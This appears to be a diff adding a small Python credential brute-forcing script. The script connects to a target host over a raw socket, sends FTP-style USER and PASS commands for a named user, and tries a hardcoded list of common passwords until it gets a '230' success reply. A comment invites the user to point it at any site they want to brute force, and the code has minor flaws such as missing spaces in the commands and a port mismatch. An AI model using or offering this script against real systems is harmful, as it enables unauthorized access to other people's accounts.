@@ -1,0 +1,33 @@
+import socket
+import sys
+
+def connect(username, password):
+    try:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('127.0.0.1',443)) # replace 127.0.01 ip of Web that you want brute force
+        data = s.recv(1024).decode()
+        
+        s.send(f'USER{username}\r\n'.encode())
+        data = s.recv(1024).decode()
+        
+        s.send(f'PASS{password}\r\n'.encode())
+        data =  s.recv(1024).decode()
+    
+        s.send('QUIT\r\n'.encode())
+        s.close()
+    
+        return data
+    except(socket.gaierror,socket.herror,ConnectionRefusedError) as e:
+        print(f"Socket error:{e}")
+        return None
+
+username = "suniljudha"
+passwords = ["test", "backup", "password", "12345","ALWAYShappy@1", "ALWAYShappy1", "root", "administrator", "ftp", "admin1"]
+
+for password in passwords:
+    attempt = connect(username, password)
+    if attempt and "230" in attempt:
+        print(f"[+] Password found: {password}")
+        sys.exit(0)
+        
+print("[-] Password not found.")
